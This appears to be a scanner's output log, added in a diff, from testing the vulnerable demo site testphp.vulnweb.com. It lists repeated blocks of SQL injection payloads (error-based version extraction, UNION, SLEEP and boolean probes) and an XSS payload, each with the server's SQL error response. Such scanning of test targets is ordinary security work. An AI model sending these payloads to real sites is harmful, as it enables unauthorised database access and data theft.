+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: '"><iframe onload=alert('{{1234**3}}');>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: '"><iframe onload=alert('{{1234**3}}');>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: '"><iframe onload=alert('{{1234**3}}');>
+Common_Confidence: 50
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: ' OR WAITFOR DELAY "00:00:05"-- 
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: ' AND SLEEP(5)/*
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
+Common_Confidence: 60
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: "' AND IF(1=1,SLEEP(5),0)--
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
